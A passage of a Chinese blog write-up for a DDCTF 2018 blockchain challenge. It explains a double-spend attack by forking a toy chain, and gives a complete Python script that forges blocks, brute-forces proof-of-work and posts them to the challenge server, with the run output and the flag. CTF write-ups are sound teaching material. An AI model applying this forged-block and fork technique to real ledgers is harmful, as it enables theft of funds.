class="number">1000000</span>:</span><br><span class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></span><br><span class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></span><br><span class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></span><br><span class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</span><br><span class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</span><br><span class="line">        append_block(new_block)</span><br><span class="line">        msg += <span class="string">' You receive a diamond.'</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure></p>
+<p>发现即shop的账户中拥有1000000即可获得钻石一枚<br>但是我们该系统中一共只有100万的DDB，如何去购买2颗钻石呢？<br>这里就涉及到了双花攻击(51%攻击)<br>顾名思义，双花攻击，花费100万，购买200万的物品，甚至更多的物品。<br>首先明确一点，这时没有人和我们比拼算力<br>即我们拥有100%的算力,所以我们可以轻松添加区块，改变主链走向<br>那么这和双花攻击有什么关系呢？<br>我们从下面的图片进行分析<br><img src="/images/bitcoin (1).png"><br>蓝色为目前题目的3个区块<br>区块操作之前已经描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一个区块：创世区块</span><br><span class="line">向银行地址发放DDB为1000000</span><br><span class="line">第二个区块：黑客添加区块</span><br><span class="line">让银行账户向黑客账户转账999999 DDB</span><br><span class="line">第三个区块：空区块</span><br></pre></td></tr></table></figure></p>
+<p>而由于我们拥有100%算力，我们可以使用攻击，重新计算已经确认过的区块，改变区块走向<br>故此我们来到3个红色区块的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">黑客区块2：向shop转账100万</span><br><span class="line">黑客区块3：空区块</span><br><span class="line">黑客区块4：空区块</span><br></pre></td></tr></table></figure></p>
+<p>此时由于我们算力最强，没有人可以计算的过我们，我们成功改变主链走向<br>此时主链变为<br><img src="/images/bitcoin (2).png"><br>而由于现在主链变为红色部分，之前黑客的操作全部作废<br>所以此时我们的操作成立，即shop获得100万，我们获得钻石一枚<br>此时我们可以触发双花攻击<br>即我们让shop把这100万转出去，然后改变主链走向，让这一操作不成立，则100万又会返回到shop，此时我们的钻石又会继续+1<br>如图<br><img src="/images/bitcoin (3).png"><br>我们现在的主链为红色部分，我们在黑客区块5，让shop给shop_wallet_addressz转账100万<br>然后我们利用最强算力<br>重新计算黑客区块5(已确认过的区块)<br>生成空区块(绿色部分)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑客区块6</span><br><span class="line">黑客区块7</span><br></pre></td></tr></table></figure></p>
+<p>由于我们后续创建的分叉支路(绿色)更长<br>所以成为主链<br><img src="/images/bitcoin (4).png"><br>之前的shop转账操作作废，100万回到shop手中<br>此时我们的钻石即可再次+1<br>故此可以完成此题</p>
+<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>首先我们关注到hacker区块的写法，即原始第二个区块<br>为了模仿黑客创建区块的转账写法，我们去跟一跟源码，以便创造我们自己的伪区块，给shop转账<br>从路由<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(url_prefix + '/')</span></span><br></pre></td></tr></table></figure></p>
+<p>中我们可以看到<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></span><br><span class="line">    announcement = <span class="string">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span></span><br><span class="line">    balance, utxos, _ = get_balance_of_all()</span><br></pre></td></tr></table></figure></p>
+<p>我们跟进<code>get_balance_of_all()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    tail = find_blockchain_tail()</span><br><span class="line">    utxos = calculate_utxo(tail)</span><br><span class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</span><br></pre></td></tr></table></figure></p>
+<p>我们跟进init()<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</span><br><span class="line">append_block(second_block)</span><br></pre></td></tr></table></figure></p>
+<p>我们继续跟进create_block()<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</span><br><span class="line">    nonce = str(nonce_str)</span><br><span class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</span><br><span class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</span><br><span class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</span><br><span class="line">    <span class="keyword">return</span> block</span><br></pre></td></tr></table></figure></p>
+<p>可以得到区块生成需要的元素<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中<br>prev为前一个区块的hash<br>nonce需要我们自行爆破遍历<br>transactions(交易)需要我们自己计算<br>然后我们跟进append_block()<br>不难发现关键语句<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</span><br><span class="line">block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</span><br><span class="line">block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>] + <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>其中要求<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>故此我们可以写出爆破函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">(b, difficulty, msg=<span class="string">""</span>)</span>:</span></span><br><span class="line">    nonce = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> nonce&lt;(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        b[<span class="string">'nonce'</span>] = msg+str(nonce)</span><br><span class="line">        b[<span class="string">'hash'</span>] = hash_block(b)</span><br><span class="line">        block_hash = int(b[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> block_hash &lt; difficulty:</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        nonce+=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>而关于transactions的计算在create_block()中同样有体现，我就不赘述了，可以浓缩为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tx = &#123;<span class="string">"input"</span>:[input],<span class="string">"output"</span>:[&#123;<span class="string">"amount"</span>:<span class="number">1000000</span>, <span class="string">'id'</span>:txout_id,<span class="string">'addr'</span>:shop_address&#125;],<span class="string">'signature'</span>:[signature]&#125;</span><br><span class="line">tx[<span class="string">"output"</span>][<span class="number">0</span>][<span class="string">"hash"</span>] = hash_utxo(tx[<span class="string">"output"</span>][<span class="number">0</span>])</span><br><span class="line">tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">block1[<span class="string">"transactions"</span>] = [tx]</span><br></pre></td></tr></table></figure></p>
+<p>至此三元素基本解决<br>值得一提的是，空区块无需计算transactions，所以基本就是爆破遍历Nonce了<br>最后可以写出一键化运行脚本</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>安装好库依赖，一键化脚本，直接运行即可获得flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> rsa, uuid, json, copy,requests,re,hashlib</span><br><span class="line"><span class="comment"># 获取初始session</span></span><br><span class="line">url = <span class="string">"http://116.85.48.107:5000/b942f830cf97e/"</span></span><br><span class="line">r = requests.get(url=url)</span><br><span class="line">session = r.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line">Cookie = &#123;</span><br><span class="line">    <span class="string">"session"</span>:session</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=Cookie)</span><br><span class="line"><span class="comment"># 获取需要的信息</span></span><br><span class="line">genesis_hash_re = <span class="string">r'hash of genesis block: (.*?)&lt;br /&gt;&lt;br /&gt;'</span></span><br><span class="line">genesis_hash = re.findall(genesis_hash_re, r.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">shop_address_re = <span class="string">r", the shop's addr: (.*?)&lt;br /&gt;&lt;br /&gt;"</span></span><br><span class="line">shop_address = re.findall(shop_address_re, r.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">input_re = <span class="string">r'''\[\&#123;"input": \["(.*?)"\],'''</span></span><br><span class="line">input = re.findall(input_re, r.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">signature_re = <span class="string">r'''"\], "signature": \["(.*?)"\]'''</span></span><br><span class="line">signature = re.findall(signature_re, r.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">txout_id = str(uuid.uuid4())</span><br><span class="line"><span class="comment">#工作量证明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">(b, difficulty, msg=<span class="string">""</span>)</span>:</span></span><br><span class="line">    nonce = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> nonce&lt;(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        b[<span class="string">'nonce'</span>] = msg+str(nonce)</span><br><span class="line">        b[<span class="string">'hash'</span>] = hash_block(b)</span><br><span class="line">        block_hash = int(b[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> block_hash &lt; difficulty:</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        nonce+=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myprint</span><span class="params">(b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(b)</span><br><span class="line"></span><br><span class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hash(hash(x) + hash(y))</span><br><span class="line"></span><br><span class="line">EMPTY_HASH = <span class="string">'0'</span> * <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</span><br><span class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</span><br><span class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>],</span><br><span class="line">                                 reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">empty_block</span><span class="params">(msg, prevHash)</span>:</span></span><br><span class="line">    b=&#123;&#125;</span><br><span class="line">    b[<span class="string">"prev"</span>] = prevHash</span><br><span class="line">    b[<span class="string">"transactions"</span>] = []</span><br><span class="line">    b = pow(b, DIFFICULTY, msg)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="comment">#从创世块开始分叉，给商店转1000000</span></span><br><span class="line">block1 = &#123;&#125;</span><br><span class="line">block1[<span class="string">"prev"</span>] = genesis_hash</span><br><span class="line">tx = &#123;<span class="string">"input"</span>:[input],<span class="string">"output"</span>:[&#123;<span class="string">"amount"</span>:<span class="number">1000000</span>, <span class="string">'id'</span>:txout_id,<span class="string">'addr'</span>:shop_address&#125;],<span class="string">'signature'</span>:[signature]&#125;</span><br><span class="line">tx[<span class="string">"output"</span>][<span class="number">0</span>][<span class="string">"hash"</span>] = hash_utxo(tx[<span class="string">"output"</span>][<span class="number">0</span>])</span><br><span class="line">tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">block1[<span class="string">"transactions"</span>] = [tx]</span><br><span class="line">block1 = pow(block1, DIFFICULTY)</span><br><span class="line">url_begin = <span class="string">"http://116.85.48.107:5000/b942f830cf97e/create_transaction"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">header_change</span><span class="params">(session)</span>:</span></span><br><span class="line">    header = &#123;</span><br><span class="line">    <span class="string">"Host"</span>:<span class="string">"116.85.48.107:5000"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"session="</span>+session,</span><br><span class="line">    <span class="string">"Connection"</span>:<span class="string">"close"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/json"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line">s1 = requests.post(url=url_begin,data=myprint(block1),headers=header_change(session))</span><br><span class="line">session1 = s1.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s1.content</span><br><span class="line"><span class="comment">#构造空块增加分叉链长度，使分叉链最长，因为max的结果不唯一，少则一次多则两次</span></span><br><span class="line">block2 = empty_block(<span class="string">"myempty1"</span>, block1[<span class="string">"hash"</span>])</span><br><span class="line">s2 = requests.post(url=url_begin,data=myprint(block2),headers=header_change(session1))</span><br><span class="line">session2 = s2.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s2.content</span><br><span class="line">block3 = empty_block(<span class="string">"myempty2"</span>, block2[<span class="string">"hash"</span>])</span><br><span class="line">s3 = requests.post(url=url_begin,data=myprint(block3),headers=header_change(session2))</span><br><span class="line">session3 = s3.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s3.content</span><br><span class="line"><span class="comment">#余额更新成功,系统自动添加块，转走商店钱，钻石+１</span></span><br><span class="line"><span class="comment">#从自己的块，即系统转走钱之前的那个块再次分叉，添加空块</span></span><br><span class="line">block4 = empty_block(<span class="string">"myempty3"</span>, block3[<span class="string">"hash"</span>])</span><br><span class="line">s4 = requests.post(url=url_begin,data=myprint(block4),headers=header_change(session3))</span><br><span class="line">session4 = s4.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s4.content</span><br><span class="line">block5 = empty_block(<span class="string">"myempty4"</span>, block4[<span class="string">"hash"</span>])</span><br><span class="line">s5 = requests.post(url=url_begin,data=myprint(block5),headers=header_change(session4))</span><br><span class="line">session5 = s5.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s5.content</span><br><span class="line"></span><br><span class="line">flag_url = <span class="string">"http://116.85.48.107:5000/b942f830cf97e/flag"</span></span><br><span class="line">flag = requests.get(url=flag_url,headers=header_change(session5))</span><br><span class="line"><span class="keyword">print</span> flag.content</span><br><span class="line"><span class="comment">#新的分叉链最长，余额更新成功，钻石+１</span></span><br></pre></td></tr></table></figure></p>
+<p>运行结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">transaction finished.</span><br><span class="line">transaction finished. You receive a diamond.</span><br><span class="line">transaction finished. You receive a diamond.</span><br><span class="line">transaction finished. You receive a diamond.</span><br><span class="line">transaction finished.</span><br><span class="line">Here is your flag: DDCTF&#123;B1OcKch@iN_15_FuN_d03f8306a6e&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;B1OcKch@iN_15_FuN_d03f8306a6e&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>区块链博大精深，初涉皮毛，希望以后可以深入学习，顺应时代潮流~</p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+            <li class="next">
+                <a href= "/2018/04/27/线下AD-代码审计-ECShop-V2-7-3/" title= 线下AD&代码审计&ECShop V2.7.3 >
+                    <span>Next Post</span>
+                    <span>线下AD&代码审计&ECShop V2.7.3</span>
+                </a>
+            </li>
+        
+        
+            <li class="previous">
+                <a href= "/2018/04/21/数据分析-企业渗透过程/" title= 数据分析-企业渗透过程 >
+                    <span>Previous Post</span>
+                    <span>数据分析-企业渗透过程</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:136244588@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/skyofkinglove" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv" style="color:black;font-size:14px">VISITOR VOLUME: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#区块链与比特币基础学习"><span class="toc-number">2.</span> <span class="toc-text">区块链与比特币基础学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#起源"><span class="toc-number">2.1.</span> <span class="toc-text">起源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本概念"><span class="toc-number">2.2.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#区块链的特点"><span class="toc-number">2.3.</span> <span class="toc-text">区块链的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#区块链的结构"><span class="toc-number">2.4.</span> <span class="toc-text">区块链的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#挖矿与比特币"><span class="toc-number">2.5.</span> <span class="toc-text">挖矿与比特币</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#区块链分叉问题"><span class="toc-number">2.6.</span> <span class="toc-text">区块链分叉问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#区块链攻击"><span class="toc-number">3.</span> <span class="toc-text">区块链攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">4.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload构造"><span class="toc-number">5.</span> <span class="toc-text">payload构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">6.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">7.</span> <span class="toc-text">后记</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
